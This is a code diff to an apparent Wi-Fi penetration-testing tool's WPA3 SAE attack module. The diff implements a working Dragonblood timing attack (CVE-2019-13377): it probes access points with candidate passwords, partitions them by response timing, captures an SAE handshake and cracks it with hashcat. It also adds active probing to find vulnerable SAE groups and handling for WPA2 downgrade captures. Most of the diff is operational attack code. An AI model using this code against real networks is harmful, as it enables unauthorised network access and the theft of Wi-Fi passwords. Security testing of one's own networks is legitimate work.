@@ -23,6 +23,9 @@ from ..util.wpa3 import WPA3Detector, WPA3Info
 from ..util.wpa3_tools import WPA3ToolChecker
 from ..attack.wpa3_strategy import WPA3AttackStrategy
 from ..model.handshake import Handshake
+from ..model.sae_result import CrackResultSAE
+from ..model.wpa_result import CrackResultWPA
+from contextlib import contextmanager
 import time
 import os
 
@@ -190,20 +193,143 @@ class AttackWPA3SAE(Attack):
         result = self.attempt_downgrade()
         if result:
             Color.pl('{+} {G}Downgrade successful! Captured WPA2 handshake{W}')
+            # attempt_downgrade() returns a Handshake (WPA2 4-way). Wrap it
+            # so all.py's `attack.crack_result.save()` doesn't crash.
+            self.crack_result = CrackResultWPA(
+                result.bssid, result.essid, result.capfile, None)
+            self.crack_result.dump()
             self.success = True
             return True
         Color.pl('{!} {O}Downgrade attack failed{W}')
         return False
 
     def _try_dragonblood(self):
-        """Execute dragonblood strategy without internal fallback."""
-        Color.pl('{+} {C}Attempting Dragonblood exploitation...{W}')
+        """
+        Execute Dragonblood timing attack (CVE-2019-13377).
+
+        When the AP uses MODP groups 22/23/24, the SAE hunting-and-pecking
+        algorithm leaks timing information through the quadratic-residue
+        test.  This method:
+          1. Displays vulnerability details
+          2. Runs timing probes against the AP with candidate passwords
+          3. Partitions the password space into fast/slow buckets
+          4. Reorders the wordlist and cracks with hashcat
+
+        Falls through to the next strategy if timing is disabled,
+        not viable, or cracking fails.
+        """
+        from ..util.dragonblood import DragonbloodDetector
+        from ..util.dragonblood_timing import DragonbloodTimingAttack
+
+        Color.pl('{+} {C}Attempting Dragonblood exploitation (CVE-2019-13377)...{W}')
         if self.view:
-            self.view.add_log('Starting Dragonblood exploitation')
+            self.view.add_log('Starting Dragonblood timing attack')
+
+        # Always show vulnerability details
         self._display_dragonblood_vulnerability()
-        Color.pl('{!} {O}Full Dragonblood exploitation requires specialized tools{W}')
-        Color.pl('{!} {O}Consider using: dragonslayer, dragonforce, or dragontime{W}')
-        return False  # Dragonblood is informational, always falls through
+
+        # Check if timing attack is enabled and viable
+        if not Configuration.dragonblood_timing:
+            Color.pl('{!} {O}Dragonblood timing attack not enabled{W}')
+            Color.pl('{!} {O}Use --dragonblood-timing to enable, '
+                     'or use external tools: dragonslayer, dragonforce{W}')
+            return False
+
+        # If passive detection didn't find any vulnerable MODP group,
+        # actively probe the AP for support. SAE groups are not in
+        # beacons — without captured SAE frames OR an active probe,
+        # sae_groups falls back to [19] and the viability check fails
+        # even against genuinely-vulnerable APs.
+        if not DragonbloodDetector.is_timing_attack_viable(self.wpa3_info):
+            self._active_probe_for_vulnerable_groups()
+
+        if not DragonbloodDetector.is_timing_attack_viable(self.wpa3_info):
+            Color.pl('{!} {O}Timing attack not viable: '
+                     'no vulnerable MODP groups (22, 23, 24) detected{W}')
+            return False
+
+        # Need a wordlist for timing probes
+        wordlist = Configuration.wordlist
+        if not wordlist or not os.path.isfile(wordlist):
+            Color.pl('{!} {O}No wordlist available for timing probes{W}')
+            Color.pl('{!} {O}Provide a wordlist with --dict to enable '
+                     'Dragonblood timing attack{W}')
+            return False
+
+        # Read candidate passwords (limited set for probing)
+        max_pw = Configuration.dragonblood_max_passwords
+        candidates = self._read_probe_candidates(wordlist, max_pw)
+        if not candidates:
+            Color.pl('{!} {O}No candidate passwords loaded from wordlist{W}')
+            return False
+
+        Color.pl('{+} {C}Loaded %d candidate passwords for timing probes{W}'
+                 % len(candidates))
+
+        # Determine the vulnerable SAE group to target
+        sae_groups = self.wpa3_info.get('sae_groups', [])
+        target_group = 0
+        for g in [22, 23, 24]:
+            if g in sae_groups:
+                target_group = g
+                break
+
+        # Run the timing attack
+        timing = DragonbloodTimingAttack(
+            interface=Configuration.interface,
+            target_bssid=self.target.bssid,
+            target_essid=self.target.essid or '',
+            target_channel=int(self.target.channel),
+            sae_group=target_group,
+        )
+
+        try:
+            analysis = timing.run(
+                passwords=candidates,
+                num_samples=Configuration.dragonblood_samples,
+                view=self.view,
+            )
+
+            if not analysis or analysis.total_samples < timing.MIN_SAMPLES:
+                Color.pl('{!} {O}Insufficient timing data collected{W}')
+                timing.print_report()
+                return False
+
+            # Show results
+            timing.print_report()
+
+            # Enrich the vulnerability report
+            if hasattr(self, 'dragonblood_vuln') and self.dragonblood_vuln:
+                DragonbloodDetector.enrich_with_timing(
+                    self.dragonblood_vuln, analysis)
+
+            if self.view:
+                self.view.add_log(
+                    f'Timing analysis: {analysis.confidence:.0%} confidence, '
+                    f'{len(analysis.fast_passwords)} fast passwords')
+
+            # If the partition is meaningful, reorder the wordlist and crack
+            if analysis.confidence >= 0.3 and analysis.fast_passwords:
+                Color.pl('{+} {G}Timing partition usable — '
+                         'reordering wordlist for optimised cracking{W}')
+
+                optimised_wl = timing.get_prioritised_wordlist(wordlist)
+                if optimised_wl:
+                    return self._crack_with_wordlist(optimised_wl)
+
+            Color.pl('{!} {O}Timing partition too weak for reliable '
+                     'password space reduction{W}')
+            return False
+
+        except KeyboardInterrupt:
+            Color.pl('\n{!} {O}Dragonblood timing attack interrupted{W}')
+            raise
+        except Exception as e:
+            Color.pl('{!} {R}Dragonblood timing error: %s{W}' % str(e))
+            log_info('AttackWPA3', 'Dragonblood timing failed: %s' % e)
+            return False
+        finally:
+            timing.cleanup()
 
     def _try_sae_capture(self):
         """Execute SAE capture strategy."""
@@ -216,7 +342,7 @@ class AttackWPA3SAE(Attack):
         handshake = self.capture_sae_handshake()
         if handshake:
             Color.pl('{+} {G}SAE handshake captured successfully{W}')
-            self.success = True
+            self._finalize_sae_success(handshake, key=None)
             return True
         Color.pl('{!} {O}SAE handshake capture failed{W}')
         return False
@@ -248,9 +374,118 @@ class AttackWPA3SAE(Attack):
         handshake = self.passive_capture()
         if handshake:
             Color.pl('{+} {G}SAE handshake captured passively{W}')
-            self.success = True
+            self._finalize_sae_success(handshake, key=None)
             return True
         return False
+
+    def _finalize_sae_success(self, handshake, key):
+        """Wrap a captured SAE handshake in CrackResultSAE and set success.
+
+        `handshake` is an SAEHandshake object (has .capfile / .bssid / .essid).
+        `key` is the cracked PSK if known, else None.
+        """
+        self.crack_result = CrackResultSAE(
+            handshake.bssid, handshake.essid, handshake.capfile, key)
+        self.crack_result.dump()
+        self.success = True
+
+    def _active_probe_for_vulnerable_groups(self):
+        """
+        Actively probe the AP to discover supported SAE groups.
+
+        Sends SAE Commit frames per candidate group via wpa_supplicant and
+        updates `self.wpa3_info['sae_groups']` with the accepted set.
+        Requires temporarily flipping the interface to managed mode —
+        wpa_supplicant can't drive a monitor-mode interface.
+        """
+        interface = Configuration.interface
+        if not interface:
+            return
+        if not self.target.essid:
+            Color.pl('{!} {O}Active SAE probing needs an ESSID; target is hidden{W}')
+            return
+
+        Color.pl('{+} {C}Actively probing AP for supported SAE groups '
+                 '(briefly switching to managed mode)...{W}')
+        if self.view:
+            self.view.add_log('Active SAE group probing')
+
+        results = {}
+        try:
+            with self._managed_mode_for_probe(interface):
+                results = WPA3Detector.probe_sae_groups_active(
+                    interface=interface,
+                    bssid=self.target.bssid,
+                    essid=self.target.essid,
+                    channel=int(self.target.channel),
+                )
+        except Exception as e:
+            Color.pl('{!} {O}Active SAE probing failed: %s{W}' % e)
+            log_debug('AttackWPA3', 'active probe error: %s' % e)
+            return
+
+        accepted = sorted(g for g, s in results.items() if s == 'accepted')
+        rejected = sorted(g for g, s in results.items() if s == 'rejected')
+        if not accepted and not rejected:
+            Color.pl('{!} {O}Active probing yielded no usable signal '
+                     '(AP unresponsive or interface setup issue){W}')
+            return
+
+        Color.pl('{+} {C}Probed SAE groups — accepted: {G}%s{C}  rejected: {O}%s{W}'
+                 % (accepted or '-', rejected or '-'))
+        if self.view:
+            self.view.add_log('Accepted groups: %s' % (accepted or '-'))
+
+        # Merge accepted groups into wpa3_info and recompute vulnerability.
+        if accepted:
+            self.wpa3_info['sae_groups'] = accepted
+            self.wpa3_info['dragonblood_vulnerable'] = any(
+                g in WPA3Detector.VULNERABLE_SAE_GROUPS for g in accepted)
+            # Also propagate to the cached WPA3Info object so later
+            # strategy decisions see the same state.
+            info = getattr(self.target, 'wpa3_info', None)
+            if info is not None and hasattr(info, 'sae_groups'):
+                info.sae_groups = accepted
+                info.dragonblood_vulnerable = self.wpa3_info['dragonblood_vulnerable']
+
+    @staticmethod
+    @contextmanager
+    def _managed_mode_for_probe(interface):
+        """
+        Context manager: put `interface` in managed mode, restore monitor.
+
+        wpa_supplicant requires a managed-mode interface; our scanning
+        interface is normally in monitor mode. We use iw to toggle and
+        ensure we restore even on error.
+        """
+        from ..tools.iw import Iw
+        from ..tools.ip import Ip
+        was_monitor = False
+        try:
+            was_monitor = Iw.is_monitor(interface)
+        except Exception:
+            was_monitor = True  # assume monitor; restore conservatively
+
+        try:
+            if was_monitor:
+                Ip.down(interface)
+                Iw.mode(interface, 'managed')
+                Ip.up(interface)
+                log_debug('AttackWPA3',
+                          '%s → managed mode for SAE probing' % interface)
+            yield
+        finally:
+            if was_monitor:
+                try:
+                    Ip.down(interface)
+                    Iw.mode(interface, 'monitor')
+                    Ip.up(interface)
+                    log_debug('AttackWPA3',
+                              '%s → monitor mode restored' % interface)
+                except Exception as e:
+                    log_debug('AttackWPA3',
+                              'monitor restore failed for %s: %s'
+                              % (interface, e))
 
     def _check_wpa3_tools(self):
         """
@@ -354,6 +589,68 @@ class AttackWPA3SAE(Attack):
                 self.dragonblood_vuln,
                 verbose=True
             )
+
+    @staticmethod
+    def _read_probe_candidates(wordlist_path: str, max_count: int) -> list:
+        """
+        Read the first *max_count* valid WPA passwords from a wordlist.
+
+        Filters to 8-63 character passwords (WPA-PSK / SAE requirement).
+        """
+        candidates = []
+        try:
+            with open(wordlist_path, 'r', errors='replace') as fh:
+                for line in fh:
+                    word = line.rstrip('\n\r')
+                    if 8 <= len(word) <= 63:
+                        candidates.append(word)
+                        if len(candidates) >= max_count:
+                            break
+        except Exception as e:
+            log_info('AttackWPA3', 'Error reading wordlist: %s' % e)
+        return candidates
+
+    def _crack_with_wordlist(self, wordlist_path: str) -> bool:
+        """
+        Crack a captured SAE handshake using hashcat with the given wordlist.
+
+        Attempts a quick SAE capture, then cracks with hashcat mode 22000
+        using the timing-optimised wordlist.
+
+        Returns:
+            True if cracking succeeds.
+        """
+        from ..util.sae_crack import SAECracker
+
+        Color.pl('{+} {C}Capturing SAE handshake for Dragonblood-optimised cracking...{W}')
+        if self.view:
+            self.view.add_log('Capturing SAE handshake for optimised cracking')
+
+        sae_hs = self.capture_sae_handshake()
+        if not sae_hs:
+            Color.pl('{!} {O}Could not capture SAE handshake for cracking{W}')
+            return False
+
+        Color.pl('{+} {C}Cracking with timing-optimised wordlist...{W}')
+        if self.view:
+            self.view.add_log('Cracking with timing-optimised wordlist')
+
+        key = SAECracker.crack_sae_handshake(
+            sae_hs,
+            wordlist=wordlist_path,
+            show_command=True,
+            verbose=True,
+        )
+        if key:
+            Color.pl('{+} {G}Dragonblood timing attack successful!{W}')
+            Color.pl('{+} {G}Key: {C}%s{W}' % key)
+            self._finalize_sae_success(sae_hs, key=key)
+            if self.view:
+                self.view.add_log(f'Key found: {key}')
+            return True
+
+        Color.pl('{!} {O}Cracking with timing-optimised wordlist failed{W}')
+        return False
 
     def _display_strategy(self):
         """Display selected attack strategy to user."""
@@ -803,7 +1100,7 @@ class AttackWPA3SAE(Attack):
                         else:
                             # Incomplete handshake detected
                             incomplete_handshake_count += 1
-                            Color.pl('{!} {O}Incomplete SAE handshake detected (attempt %d/%d){W}' % 
+                            Color.pl('\n{!} {O}Incomplete SAE handshake detected (attempt %d/%d){W}' %
                                    (incomplete_handshake_count, max_incomplete_attempts))
                             if self.view:
                                 self.view.add_log(f'Incomplete handshake (attempt {incomplete_handshake_count})')
@@ -974,7 +1271,7 @@ class AttackWPA3SAE(Attack):
                         else:
                             # Incomplete handshake detected
                             incomplete_handshake_count += 1
-                            Color.pl('{!} {O}Incomplete SAE handshake detected (attempt %d){W}' % 
+                            Color.pl('\n{!} {O}Incomplete SAE handshake detected (attempt %d){W}' %
                                    incomplete_handshake_count)
                             if self.view:
                                 self.view.add_log(f'Incomplete handshake (attempt {incomplete_handshake_count})')
